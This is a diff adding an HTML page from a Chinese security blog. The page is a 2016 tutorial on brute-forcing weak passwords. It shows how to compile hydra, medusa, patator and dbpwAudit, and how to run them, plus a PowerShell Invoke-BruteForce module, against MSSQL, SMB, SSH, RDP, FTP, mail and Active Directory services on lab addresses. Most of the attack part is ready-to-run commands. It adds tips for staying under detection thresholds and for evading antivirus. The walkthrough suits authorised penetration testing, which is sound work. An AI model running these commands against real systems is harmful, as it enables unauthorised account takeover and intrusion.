@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="永不消失的 &#39;0day&#39; [ 弱口令 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>永不消失的 &#39;0day&#39; [ 弱口令 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/08/18/service-brute-force/">
+                永不消失的 '0day' [ 弱口令 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/service-brute-force/">service brute force</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 hydra 选项用途简要说明</p>
+<p>这里暂以linux平台使用为例,实际测试中也推荐大家在linux平台上自己编译,不然有些服务模块可能不太好使,虽然已经有编译好的win版本,但不太建议实际用,如果真没办法非要在win上跑,建议大家还是用7.x之前的版本吧,新版本中确实还有很多问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</div><div class="line">-S 	爆破https时需要加上该选项</div><div class="line">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</div><div class="line">-l/-L 	指定用户名 / 指定用户名字典文件</div><div class="line">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</div><div class="line">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</div><div class="line">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">'进程'</span>退出,-F表示全局退出</div><div class="line">-t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能无限大,基于目标系统而定,大家酌情使用吧</div><div class="line">-w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</div><div class="line">-<span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span class="number">6</span>表示用ipv6</div><div class="line">-v 	显示爆破信息</div><div class="line">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</div></pre></td></tr></table></figure></p>
+<p>0x02 在linux中编译安装hydra,此处暂以centos6.8 x64为例:</p>
+<p>务必事先安装好所需的各种依赖库,因为hydra在破解各种服务的时候,可能会用到各类服务自己devel库中的一些函数,也就意味着你可能要装很多个库,因为它本身就支持很多服务的在线爆破,其实,就这一点来说,hydra本身做的事情并不算多,因为大多都要依赖别的库函数来实现,这样来看的话,hydra本质上只是把各种服务整合了一下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf libssh-0.4.8.tar.gz</span></div><div class="line"><span class="comment"># cd libssh-0.4.8</span></div><div class="line"><span class="comment"># mkdir build</span></div><div class="line"><span class="comment"># cd build/</span></div><div class="line"><span class="comment"># cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># /sbin/ldconfig</span></div></pre></td></tr></table></figure></p>
+<p>0x03 安装 hydra 的各种依赖库</p>
+<p>下面中的有一些库,有可能在你的环境中直接用yum装不上,没办法了,只能你自己稍微勤快点,去谷歌上找找,然后再单独手工把它装上,放心,肯定能找到解决办法的,如果中间有库装不上,可能在编译hydra时确实是可以编译成功,但等到后期实际爆破某些服务的时候就会出现各种问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development Tools"</span></div><div class="line"><span class="comment"># yum install openssl-devel pcre-devel ncurses-devel ncurses postgresql-devel libssh-devel subversion-devel gcc cmake mysql-devel subversion-devel ncpfs-devel postgresql-devel  libncurses-devel libidn-devel libpqxx-devel apr-devel apr-util-devel  firebird-devel afpfs-ng-devel</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
+<p>0x04 编译安装hydra<br>可以看到就hydra 本身的编译安装过程倒是非常简单,你也可以用–prefix指定安装目录,走的时候方便顺手把整个安装目录干掉即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf hydra-8.0.tar.gz</span></div><div class="line"><span class="comment"># cd hydra-8.0</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># hydra -h</span></div></pre></td></tr></table></figure></p>
+<p>0x05 针对各类服务的实例爆破演示:</p>
+<p>爆破mssql [大多可能都是直接针对sa,想快速getshell,实际测试速度和精度都还不错]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_mssql_sa.jpg" alt="hydra brute force"></p>
+<p>爆破smb [速度还是比较快的,针对普通域内网的效果可能会好点]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 smb://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_smb.jpg" alt="hydra brute force"></p>
+<p>爆破rlogin [该服务用的可能已经不太多了]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -L user.txt -P pass.txt -f -v rlogin://192.168.3.161</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_rlogin.jpg" alt="hydra brute force"></p>
+<p>爆破mysql [可能主要也是针对root,如果目标有waf,可能就不太好使了,过多的数据库连接容易触发报警,如果目标是linux,爆破速度还是蛮快的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -l root -P pass.txt -f -v -t 20 mysql://192.168.3.13</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_mysql.jpg" alt="hydra brute force"></p>
+<p>爆破postgresql [实际测试中,速度还是蛮快的咧]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_pgsql.jpg" alt="hydra brute force"></p>
+<p>爆破rdp [ 对于08以上的系统基本就是个废,在本地多次测试均未成功,不过对于03以下的机器目前暂时还是比较可行的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_rdp.jpg" alt="hydra brute force"></p>
+<p>爆破ssh [正常情况下的速度还可以,前面装libssh就是为了爆破它的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -l root -P pass.txt -f -v -t 20 ssh://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_ssh.jpg" alt="hydra brute force"></p>
+<p>爆破smtp[需要带目标域名后缀,所有的邮箱破解类的实际测试中都不太稳定[怀疑是某些防护的原因],偶尔能跑出来,偶尔又跑不出来,不太建议实战中用]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -v -f -t 20 smtp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_smtp.jpg" alt="hydra brute force"><br></p>
+<p>爆破pop3[不需要域名后缀,只需正确的账号密码即可,同样,很不稳定,有兴趣,可以拿常用公共邮箱测测精度,如:gmail,outlook,126,163,sina,qq…]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -v -f -t 20 smtp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p>爆破ftp [还算靠谱,不过需要前期好好搜集下目标的用户名]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_ftp.jpg" alt="hydra brute force"></p>
+<p>爆破telnet [靠谱]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 telnet://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_telnet.jpg" alt="hydra brute force"></p>
+<p>爆破vnc [无须用户名,本地多次测试都未成功]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -P pass.txt -f -v -t 20 vnc://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p>爆破snmp [暂时还好使]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -P pass.txt -f -v -t 20 snmp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_snmp.jpg" alt="hydra brute force"><br></p>
+<p>爆破svn [实际中多次测试均未跑出来]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 svn://192.168.3.13</span></div></pre></td></tr></table></figure></p>
+<p>爆破ldap2/3(同样跑不出来):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 ldap2://192.168.3.161</span></div></pre></td></tr></table></figure></p>
+<p>爆破redis:<br><br><br></p>
+<p>hydra 使用小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;支持的服务比较多,这里就不一一演示了,大家可根据实际情况针对性的用,就个人使用来讲,hydra精度真的很一般 [尤其是在爆破各类邮件服务时,比如,pop3,smtp[这个还好点儿] ,imap,时好时坏,极不稳定,原因暂未找],速度也极为一般,单单就稳定性来讲,不是很靠谱,不过这里仅供参考,建议大家还是根据自己的实际情况来,一面之词,不足为信,大家可以自己实际使用为准<br><br><br></p>
+<p>0x05 使用 medusa </p>
+<p>偶尔会断,原因暂未查,不过,如果是实际爆破,相对来讲,个人还是比较推荐这个,尤其当拿下的目标机器是linux时,虽然,它支持的服务可能并没有hydra那么多,但个人还是比较喜欢它 [稳定,精度较高],毕竟是帮忙搞了不少事情,不幸的是,它没有win版,作者说它自己用Cygwin始终都没编译成功,如果你编译成功了,请立马告诉他,他也许还会请你喝杯啤酒啥的,嘿嘿……</p>
+<p>支持爆破的服务模块,在kali中的默认路径如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/medusa/modules</div></pre></td></tr></table></figure></p>
+<p>自己编译后的默认服务模块路径,默认如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/local/lib/medusa/modules</div></pre></td></tr></table></figure></p>
+<p>关于不同系统平台所要安装的一些依赖库,在工具官方站点中已有详细说明,链接如下,请自行查看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/foofus.net/goons</span><span class="regexp">/jmk/medusa</span><span class="regexp">/medusa.html</span></div></pre></td></tr></table></figure></p>
+<p>编译安装medusa和hydra几乎没什么区别,非常简单[此处同样是以centos6.8 x64为例]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development Tools"</span></div><div class="line"><span class="comment"># yum install openssl-devel libssh2-devel postgresql-devel subversion-devel freerdp-devel</span></div><div class="line"><span class="comment"># tar -zxf medusa-2.2.tar.gz</span></div><div class="line"><span class="comment"># cd medusa-2.2</span></div><div class="line"><span class="comment"># vi INSTALL</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># medusa -h</span></div></pre></td></tr></table></figure></p>
+<p>0x06 常用选项功能说明,跟hydra选项用法基本一致,看看命令帮助就知道了,这儿不再细说:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-h 	指定目标ip或者域名</div><div class="line">-H 	要爆破多个目标时,可以统一把他们先放到一个文件中,用该选项指定即可,每个目标对应单独的一行</div><div class="line">-u/-U 	指定用户名或者包含用户名的字典</div><div class="line">-p/-P 	指定单个密码或者包含密码的字典[务必精心准备]</div><div class="line">-e n/s	跟hydra一样,尝试空密码,把用户名当密码尝试,</div><div class="line">-M 	指定要爆破的服务模块,比如是medusa支持的服务才可以,至于具体支持那些服务,看前面的模块目录即可知</div><div class="line">-n 	如果服务不是默认的端口,用该选项手工指定端口号</div><div class="line">-s 	启用ssl</div><div class="line">-f 	在爆出第一个密码之后就退出该程序</div><div class="line">-v 	显示爆破详情</div></pre></td></tr></table></figure></p>
+<p>0x07 下面是针对各类服务的一些实例爆破演示</p>
+<p>爆破mssql [同样是只针对sa]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M mssql</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_mssql.png" alt="mesua brute force"></p>
+<p>爆破mysql [针对root用户]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.13 -U user.txt -P pass.txt -f -M mysql</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_mysql.png" alt="mesua brute force"></p>
+<p>爆破smb [倒是很麻利]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M smbnt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_smbnt.png" alt="mesua brute force"></p>
+<p>爆破postgresql [速度非常快]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M postgres</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_pgsql.jpg" alt="mesua brute force"></p>
+<p>爆破rlogin [暂时还有些问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.11 -U user.txt -P pass.txt -f -M rlogin</span></div></pre></td></tr></table></figure></p>
+<p>爆破rdp [速度还不错,兼容性也非常好,起码自己在跑 2012r2 机器的rdp都没什么问题,12r2以下的系统版本就更不用说了]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M rdp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_rdp.png" alt="mesua brute force"></p>
+<p>爆破ssh [速度一般,不过精度还可以]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.11 -u root -P pass.txt -f -M ssh</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_ssh.png" alt="mesua brute force"></p>
+<p>爆破telnet [还有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M telnet</span></div></pre></td></tr></table></figure></p>
+<p>爆破ftp [实际测试中速度还是比较慢的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M ftp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_ftp.png" alt="mesua brute force"></p>
+<p>爆破smtp [跟hydra一样,所有的邮箱服务爆破都有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h target.org -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M smtp</span></div></pre></td></tr></table></figure></p>
+<p>爆破imap:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M imap</span></div></pre></td></tr></table></figure></p>
+<p>爆破pop3:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M pop3</span></div></pre></td></tr></table></figure></p>
+<p>爆破snmp [有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.160  -P pass.txt -f -v -t 20 -M snmp</span></div></pre></td></tr></table></figure></p>
+<p>爆破svn [也有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.13 -U user.txt -P pass.txt -f -M svn</span></div></pre></td></tr></table></figure></p>
+<p>爆破vnc [现在基本是没什么人用了,实际中遇到的也不太多,大多都换成了teamviewer]:</p>
+<p>0x08 medusa使用小结:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">相对稳定,精度较高,字典不易过大,控制在一万以内的高质字典即可,可能是程序本身或者目标防护的问题,有时候莫名其妙的异常,总体来讲,个人推荐</div></pre></td></tr></table></figure></p>
+<p><br><br></p>
+<p>0x09 关于patator</p>
+<p>基于py2.7 ,可定制度高,实际中你也可以选择用pywin32之类的东西把它打包成exe,某些服务模块貌似只能在linux中运行[也可能是由于我自己的系统原因吧],另外,其它的问题也非常多,极不建议在实战中使用,拿来作为样本学习还是可以的:</p>
+<p>安装好第三方py库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install pycrypto pyopenssl 加密库也经常报错</span></div><div class="line"><span class="comment"># pip install impacket    	 网络库一样经常报错</span></div><div class="line"><span class="comment"># pip install paramiko</span></div><div class="line"><span class="comment"># pip install IPy</span></div><div class="line"><span class="comment"># pip install dnspython</span></div></pre></td></tr></table></figure></p>
+<p>0x10 下面是实际爆破成功的一些服务</p>
+<p>尝试爆破smb [速度还算可以]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py smb_login host=192.168.3.23 port=445 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_smb_login.jpg" alt="patator brute force"></p>
+<p>尝试爆破ftp [非常慢]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py ftp_login host=192.168.3.23 port=21 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_ftp.jpg" alt="patator brute force"></p>
+<p>尝试爆破ssh [速度一般]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py ssh_login host=192.168.3.11 port=22 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_ssh_login.jpg" alt="patator brute force"><br></p>
+<p>另外还要爆破各类post表单的,请大家自行尝试,这里不再细说<br></p>
+<p>0x11 patator使用小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;用来跑一些比较简单的服务和post表单还行,其它的就算了吧[基本是不能用于实际的渗透场景的],另外,脚本自身还存在n多问题,除了上面这几个服务可以成功,别的基本都是不可用的,尤其是在跑一些加密服务的时候,各种错,而且依赖的插件太多[说实话,如果是在目标机器上,我都有装py库的权限了,为什么还非要用你呢,当然,如果直接是socks代理进去,就更不会用你了],从代码也大概能看的出来,作者似乎有些漫不经心,反正个人很少用,大家随意<br><br><br><br></p>
+<p>0x12 如果是直接处在目标域内网中,直接用powershell来爆破,无疑是极好的,优点,免杀效果好,小巧,灵活,定制度高,win平台首选,缺点,速度稍慢:</p>
+<p>爆破mssql [sa]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service SQL -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_sa.jpg" alt="powershell brute force"></p>
+<p>爆破ftp:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service Ftp -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_ftp.jpg" alt="powershell brute force"></p>
+<p>爆破域内用户:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName rootkit.org -UserList C:\user.txt -PasswordList C:\pass.txt -Service ActiveDirectory -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_domain_user.jpg" alt="powershell brute force"></p>
+<p>0x13 使用 dbpwAudit [一款专门针对各类数据库的爆破工具一款专门针对各类数据库的爆破工具,优势在于利用驱动跑,速度非常快]</p>
+<p>存放各类数据库驱动的默认目录:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/share/dbpwaudit/<span class="class"><span class="keyword">lib</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/driver_db.png" alt="powershell brute force"><br><img src="/img/driver_db_list.png" alt="powershell brute force"></p>
+<p>爆破mysql [暂只支持mysql 5.1以下]:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">dbpwaudit</span> <span class="selector-tag">-s</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span> <span class="selector-tag">-p</span> 3306 <span class="selector-tag">-D</span> <span class="selector-tag">Mysql</span> <span class="selector-tag">-d</span> <span class="selector-tag">mysql</span> <span class="selector-tag">-U</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">weak</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure></p>
+<p>爆破mssql [暂只支持mssql 2005以下]<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">dbpwaudit</span> <span class="selector-tag">-s</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span> <span class="selector-tag">-p</span> 1433 <span class="selector-tag">-D</span> <span class="selector-tag">Mssql</span> <span class="selector-tag">-d</span> <span class="selector-tag">master</span> <span class="selector-tag">-U</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">weak</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure></p>
+<p>0x14 利用 burpsuite 爆破各类登陆表单</p>
+<p><img src="/img/burpsuite_brute.png" alt="powershell brute force"></p>
+<p>0x15 基于perl的各种爆破小脚本,非常适合linux平台,抽空会补充上来:<br><br></p>
